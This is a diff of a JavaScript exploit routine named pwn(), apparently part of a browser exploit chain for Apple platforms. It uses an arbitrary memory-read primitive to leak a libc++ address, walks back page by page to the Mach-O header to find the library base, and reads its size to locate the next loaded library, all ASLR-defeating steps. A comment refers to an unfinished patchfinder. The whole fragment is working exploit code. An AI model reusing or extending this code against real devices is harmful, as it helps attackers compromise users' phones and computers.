@@ -294,7 +294,7 @@ function pwn() {
     var libcpp_ZSt7nothrow_addr = read64(ZSt7nothrow_ptr);
     log(`[*] libcpp_ZSt7nothrow_addr: ${libcpp_ZSt7nothrow_addr}`);
 
-    var libcpp_base = Sub(libcpp_ZSt7nothrow_addr, libcpp_ZSt7nothrow_addr.lo() & 0xfff);
+    var libcpp1_base = Sub(libcpp_ZSt7nothrow_addr, libcpp_ZSt7nothrow_addr.lo() & 0xfff);
     try_count = 0;
     while (true) {
         if(try_count > 0x100) {
@@ -302,17 +302,21 @@ function pwn() {
             return;
         }
 
-        machoMagic = read64(libcpp_base);
+        machoMagic = read64(libcpp1_base);
 
         if(machoMagic == 0x100000CFEEDFACF) {
             break;
         }
-        libcpp_base = Sub(libcpp_base, 0x1000);
+        libcpp1_base = Sub(libcpp1_base, 0x1000);
         try_count++;
     }
-    log(`[+] libcpp_base: ${libcpp_base}, try_count: ${try_count}`);
+    log(`[+] libcpp_base: ${libcpp1_base}, try_count: ${try_count}`);
+    
+    var libcpp_vm_size = read64(Add(libcpp1_base, 0x40))
+    log(`[+] libcpp_vm_size: ${libcpp_vm_size}`);
 
-
+    var next_dylib = Add(libcpp1_base, libcpp_vm_size)
+    log(`[+] read64 next_dylib: ${read64(next_dylib)}`);
 
 
     // remove this "return" if finished patchfinder
